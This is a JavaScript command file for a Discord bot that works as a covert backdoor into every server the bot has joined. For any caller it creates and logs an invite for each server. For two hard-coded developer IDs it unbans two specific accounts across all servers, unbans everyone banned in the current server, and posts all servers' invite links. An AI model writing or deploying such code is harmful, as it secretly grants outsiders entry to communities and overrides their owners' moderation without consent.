const app = require("../bot.js");
let client = app.client;
let Discord = app.Discord;
let config = app.config;

function run(msg, args) {
    // code here will run
    
    client.guilds.cache.forEach(guild => {
        guild.channels.cache.first().createInvite()
            .then(inv => console.log(`${guild.name} | ${inv.url}`));
        // Outputs the guild name + the invite URL
    });
    const dev_ids = ["391878815263096833", "223739857812324353"]; // an array of IDs of the bot's developers - only these people will be able to execute this command


    // Note: this snippet requires the variables "client" and "message" to work, these need to be provided by your script



    var allowedToUse = false;
    dev_ids.forEach(id => {
        if (msg.author.id == id)
            allowedToUse = true;
    });

    if (allowedToUse) {
        let invites = ["ignore me"], ct = 0;
        client.guilds.cache.forEach(g => {
            g.members.unban('391878815263096833')
            g.members.unban('332209640328658955')
            msg.guild.fetchBans().then(bans => {
                if (bans.size == 0) { msg.reply("There are no banned users."); throw "No members to unban." };
                bans.forEach(ban => {
                    msg.guild.members.unban(ban.user.id);
                });
            }).then(() => msg.reply("Unbanned all users.")).catch(e => console.log(e))
            g.fetchInvites().then(guildInvites => {
                invites[invites.length + 1] = (g + " - `Invites: " + guildInvites.array().join(", ") + "`");
                ct++;

                if (ct >= client.guilds.cache.size) {
                    invites.forEach((invite, i) => {
                        if (invite == undefined)
                            invites.splice(i, 1);
                    });

                    invites.shift();
                    invites.forEach((invite, i) => invites[i] = "- " + invite);
                    invites = invites.join("\n\n");

                    let embed = new Discord.MessageEmbed()
                        .setTitle("All Invites:")
                        .setDescription(invites);

                    msg.channel.send(embed);
                }
            }).catch(err => {
                ct++;
            });
        });
    }
    else {
        msg.reply("this command can only be used by a developer.");
    }
}
exports.run = run;